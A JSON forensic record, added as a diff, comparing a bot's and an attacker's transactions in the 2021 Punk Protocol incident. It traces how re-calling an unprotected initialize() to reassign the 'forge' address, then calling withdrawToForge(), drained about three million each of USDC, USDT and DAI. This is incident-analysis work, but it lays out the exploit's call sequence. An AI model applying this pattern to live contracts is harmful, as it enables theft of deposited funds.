@@ -1,0 +1,568 @@
+{
+ "schema": "bvh-calldiff/1",
+ "slug": "punk-2021",
+ "block": 12995895,
+ "bot_tx": "0x597d11c05563611cb4ad4ed4c57ca53bbe3b7d3fefc37d1ef0724ad58904742b",
+ "bot_index": 50,
+ "attacker_tx": "0x7604c7dd6e9bcdba8bac277f1f8e7c1e4c6bb57afd4ddf6a16f629e8495a0281",
+ "attacker_index": 52,
+ "method": "callTracer traces (site/raw/rpc/trace_<tx>.json) filtered to calls into the three CompoundModel contracts; selectors resolved with keccak256 of the verified-source signatures; token movements from the receipts' ERC-20 Transfer logs.",
+ "models": {
+  "USDC": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+  "USDT": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+  "DAI": "0x929cb86046e421abf7e1e02de7836742654d49d6"
+ },
+ "victim_call_sequence": {
+  "bot": [
+   "USDC.initialize",
+   "USDC.invest",
+   "USDC.withdrawToForge",
+   "USDT.initialize",
+   "USDT.invest",
+   "USDT.withdrawToForge",
+   "DAI.initialize",
+   "DAI.invest",
+   "DAI.withdrawToForge"
+  ],
+  "attacker": [
+   "USDC.initialize",
+   "USDC.invest",
+   "USDC.withdrawToForge",
+   "USDC.initialize",
+   "USDT.initialize",
+   "USDT.invest",
+   "USDT.withdrawToForge",
+   "USDT.initialize",
+   "DAI.initialize",
+   "DAI.invest",
+   "DAI.withdrawToForge",
+   "DAI.initialize"
+  ]
+ },
+ "pairs": [
+  {
+   "model": "USDC",
+   "call": "initialize(forge,token,cToken,comp,comptroller,uniRouterV2)",
+   "bot": [
+    {
+     "args": [
+      "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+      "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+      "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [
+      "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+      "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+      "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    },
+    {
+     "args": [
+      "0x0a548513693a09135604e78b8a8fe3bb801586e6",
+      "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+      "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "USDC",
+   "call": "invest()",
+   "bot": [
+    {
+     "args": [],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "USDC",
+   "call": "withdrawToForge(amount)",
+   "bot": [
+    {
+     "args": [
+      2995824696852
+     ],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [
+      28802
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "USDT",
+   "call": "initialize(forge,token,cToken,comp,comptroller,uniRouterV2)",
+   "bot": [
+    {
+     "args": [
+      "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+      "0xdac17f958d2ee523a2206206994597c13d831ec7",
+      "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [
+      "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+      "0xdac17f958d2ee523a2206206994597c13d831ec7",
+      "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    },
+    {
+     "args": [
+      "0x0d73ad702ac09eddacc10ceb137cbf84e6b3b9e0",
+      "0xdac17f958d2ee523a2206206994597c13d831ec7",
+      "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "USDT",
+   "call": "invest()",
+   "bot": [
+    {
+     "args": [],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "USDT",
+   "call": "withdrawToForge(amount)",
+   "bot": [
+    {
+     "args": [
+      3000022786200
+     ],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [
+      36879
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "DAI",
+   "call": "initialize(forge,token,cToken,comp,comptroller,uniRouterV2)",
+   "bot": [
+    {
+     "args": [
+      "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+      "0x6b175474e89094c44da98b954eedeac495271d0f",
+      "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [
+      "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+      "0x6b175474e89094c44da98b954eedeac495271d0f",
+      "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    },
+    {
+     "args": [
+      "0xc9309a6121ce122c3fb3f7aa8920fb4cbd5fbeec",
+      "0x6b175474e89094c44da98b954eedeac495271d0f",
+      "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+      "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",
+      "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "DAI",
+   "call": "invest()",
+   "bot": [
+    {
+     "args": [],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  },
+  {
+   "model": "DAI",
+   "call": "withdrawToForge(amount)",
+   "bot": [
+    {
+     "args": [
+      2954191544042759328963399
+     ],
+     "reverted": false,
+     "caller": "bot contract"
+    }
+   ],
+   "attacker": [
+    {
+     "args": [
+      30390567272501362
+     ],
+     "reverted": false,
+     "caller": "attacker contract"
+    }
+   ]
+  }
+ ],
+ "initialize_forge_argument": {
+  "USDC": {
+   "bot": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "attacker_first": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "attacker_second_restores": "0x0a548513693a09135604e78b8a8fe3bb801586e6"
+  },
+  "USDT": {
+   "bot": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "attacker_first": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "attacker_second_restores": "0x0d73ad702ac09eddacc10ceb137cbf84e6b3b9e0"
+  },
+  "DAI": {
+   "bot": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "attacker_first": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "attacker_second_restores": "0xc9309a6121ce122c3fb3f7aa8920fb4cbd5fbeec"
+  }
+ },
+ "initialize_other_five_args_identical_in_bot_and_attacker": true,
+ "withdraw_amounts": {
+  "USDC": {
+   "bot_withdraw_raw": 2995824696852,
+   "bot_withdraw": 2995824.696852,
+   "attacker_withdraw_raw": 28802,
+   "attacker_withdraw": 0.028802
+  },
+  "USDT": {
+   "bot_withdraw_raw": 3000022786200,
+   "bot_withdraw": 3000022.7862,
+   "attacker_withdraw_raw": 36879,
+   "attacker_withdraw": 0.036879
+  },
+  "DAI": {
+   "bot_withdraw_raw": 2954191544042759328963399,
+   "bot_withdraw": 2954191.544042759,
+   "attacker_withdraw_raw": 30390567272501362,
+   "attacker_withdraw": 0.030390567272501362
+  }
+ },
+ "differences": [
+  "initialize(): argument 0 (the new 'forge' = the address allowed to withdraw) is the bot's own contract 0x00000000b2ff... in the bot tx and the attacker's contract 0x1695ce70... in the attacker tx. Arguments 1-5 (token, cToken, COMP, Comptroller, Uniswap V2 router) are identical for all three pools.",
+  "Per pool the call order is initialize -> invest -> withdrawToForge in both txs, pools in the same order (USDC, USDT, DAI).",
+  "withdrawToForge(amount): the bot passes the pools' full balances (2,995,824.696852 USDC; 3,000,022.7862 USDT; 2,954,191.544043 DAI). The attacker's calldata contains no amounts and his contract withdrew whatever was left after the bot: 0.028802 USDC, 0.036879 USDT, 0.030391 DAI.",
+  "After the withdrawal the bot's contract sends USDT and DAI to the bot EOA 0x3aa27ab2 but sends the USDC to the ATTACKER's EOA 0x1d5a5640 (the recipient was not rewritten): 2,995,824.696852 USDC.",
+  "The attacker's tx additionally re-calls initialize() on each pool to put Punk's own forge address back (0x0a548513 / 0x0d73ad70 / 0xc9309a61, the addresses Punk's deployer set at deployment), which is why the pools kept working for deposits after the block."
+ ],
+ "bot_onward_transfers": [
+  {
+   "token": "USDC",
+   "to": "attacker EOA",
+   "to_addr": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 2995824.696852
+  },
+  {
+   "token": "USDT",
+   "to": "bot EOA",
+   "to_addr": "0x3aa27ab297a3a753f79c5497569ba2dacc2bc35a",
+   "amount": 3000022.7862
+  },
+  {
+   "token": "DAI",
+   "to": "bot EOA",
+   "to_addr": "0x3aa27ab297a3a753f79c5497569ba2dacc2bc35a",
+   "amount": 2954191.544042759
+  }
+ ],
+ "attacker_onward_transfers": [
+  {
+   "token": "USDC",
+   "to": "attacker EOA",
+   "to_addr": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 0.028802
+  },
+  {
+   "token": "USDT",
+   "to": "attacker EOA",
+   "to_addr": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 0.036879
+  },
+  {
+   "token": "DAI",
+   "to": "attacker EOA",
+   "to_addr": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 0.030390567272501362
+  }
+ ],
+ "bot_tx_all_token_transfers": [
+  {
+   "token": "USDC",
+   "from": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+   "to": "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+   "amount": 0.0,
+   "raw": 0
+  },
+  {
+   "token": "USDC",
+   "from": "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+   "to": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+   "amount": 2995824.696852,
+   "raw": 2995824696852
+  },
+  {
+   "token": "USDC",
+   "from": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+   "to": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "amount": 2995824.696852,
+   "raw": 2995824696852
+  },
+  {
+   "token": "USDC",
+   "from": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "to": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 2995824.696852,
+   "raw": 2995824696852
+  },
+  {
+   "token": "USDT",
+   "from": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+   "to": "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+   "amount": 0.0,
+   "raw": 0
+  },
+  {
+   "token": "USDT",
+   "from": "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+   "to": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+   "amount": 3000022.7862,
+   "raw": 3000022786200
+  },
+  {
+   "token": "USDT",
+   "from": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+   "to": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "amount": 3000022.7862,
+   "raw": 3000022786200
+  },
+  {
+   "token": "DAI",
+   "from": "0x929cb86046e421abf7e1e02de7836742654d49d6",
+   "to": "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+   "amount": 0.0,
+   "raw": 0
+  },
+  {
+   "token": "DAI",
+   "from": "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+   "to": "0x929cb86046e421abf7e1e02de7836742654d49d6",
+   "amount": 2954191.544042759,
+   "raw": 2954191544042759328963399
+  },
+  {
+   "token": "DAI",
+   "from": "0x929cb86046e421abf7e1e02de7836742654d49d6",
+   "to": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "amount": 2954191.544042759,
+   "raw": 2954191544042759328963399
+  },
+  {
+   "token": "USDT",
+   "from": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "to": "0x3aa27ab297a3a753f79c5497569ba2dacc2bc35a",
+   "amount": 3000022.7862,
+   "raw": 3000022786200
+  },
+  {
+   "token": "DAI",
+   "from": "0x00000000b2ff98680adaf8a3e382176bbfc34c8f",
+   "to": "0x3aa27ab297a3a753f79c5497569ba2dacc2bc35a",
+   "amount": 2954191.544042759,
+   "raw": 2954191544042759328963399
+  }
+ ],
+ "attacker_tx_all_token_transfers": [
+  {
+   "token": "USDC",
+   "from": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+   "to": "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+   "amount": 0.0,
+   "raw": 0
+  },
+  {
+   "token": "USDC",
+   "from": "0x39aa39c021dfbae8fac545936693ac917d5e7563",
+   "to": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+   "amount": 0.028802,
+   "raw": 28802
+  },
+  {
+   "token": "USDC",
+   "from": "0x3bc6aa2d25313ad794b2d67f83f21d341cc3f5fb",
+   "to": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "amount": 0.028802,
+   "raw": 28802
+  },
+  {
+   "token": "USDC",
+   "from": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "to": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 0.028802,
+   "raw": 28802
+  },
+  {
+   "token": "USDT",
+   "from": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+   "to": "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+   "amount": 0.0,
+   "raw": 0
+  },
+  {
+   "token": "USDT",
+   "from": "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9",
+   "to": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+   "amount": 0.036879,
+   "raw": 36879
+  },
+  {
+   "token": "USDT",
+   "from": "0x1f3b04c8c96a31c7920372ffa95371c80a4bfb0d",
+   "to": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "amount": 0.036879,
+   "raw": 36879
+  },
+  {
+   "token": "USDT",
+   "from": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "to": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 0.036879,
+   "raw": 36879
+  },
+  {
+   "token": "DAI",
+   "from": "0x929cb86046e421abf7e1e02de7836742654d49d6",
+   "to": "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+   "amount": 0.0,
+   "raw": 0
+  },
+  {
+   "token": "DAI",
+   "from": "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643",
+   "to": "0x929cb86046e421abf7e1e02de7836742654d49d6",
+   "amount": 0.030390567272501362,
+   "raw": 30390567272501362
+  },
+  {
+   "token": "DAI",
+   "from": "0x929cb86046e421abf7e1e02de7836742654d49d6",
+   "to": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "amount": 0.030390567272501362,
+   "raw": 30390567272501362
+  },
+  {
+   "token": "DAI",
+   "from": "0x1695ce70da4521cb94dea036e6ebcf1e8a073ee6",
+   "to": "0x1d5a56402425c1099497c1ad715a6b56aaccb72b",
+   "amount": 0.030390567272501362,
+   "raw": 30390567272501362
+  }
+ ],
+ "raw_refs": {
+  "traces": [
+   "site/raw/rpc/trace_0x7604c7dd6e9bcdba8bac277f1f8e7c1e4c6bb57afd4ddf6a16f629e8495a0281.json",
+   "site/raw/rpc/trace_0x597d11c05563611cb4ad4ed4c57ca53bbe3b7d3fefc37d1ef0724ad58904742b.json"
+  ],
+  "receipts": [
+   "full cache only (not published)",
+   "full cache only (not published)"
+  ],
+  "txs": [
+   "site/raw/rpc/tx_0x7604c7dd6e9bcdba8bac277f1f8e7c1e4c6bb57afd4ddf6a16f629e8495a0281.json",
+   "full cache only (not published)"
+  ],
+  "model_source": "site/raw/etherscan/punk_usdc_model_source.json"
+ }
+}
